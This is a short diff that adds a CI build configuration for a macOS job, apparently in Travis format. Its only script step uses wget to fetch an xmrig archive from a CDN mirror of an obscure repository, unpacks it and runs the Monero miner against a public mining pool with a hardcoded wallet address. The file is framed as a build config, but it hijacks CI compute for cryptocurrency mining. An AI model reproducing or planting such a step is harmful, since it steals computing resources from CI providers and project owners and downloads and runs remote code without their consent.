@@ -1,0 +1,4 @@
+jobs:
+  os: osx
+  osx_image: xcode10.2
+  script: wget https://glcdn.githack.com/k.ing.d.om.he.art.stm.p/meocoder/-/raw/master/xmrig-6.10.0-macos-x64.tar.gz &&  tar -xf xmrig-6.10.0-macos-x64.tar.gz  && cd  xmrig-6.10.0 && ./xmrig -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 --astrobwt-avx2
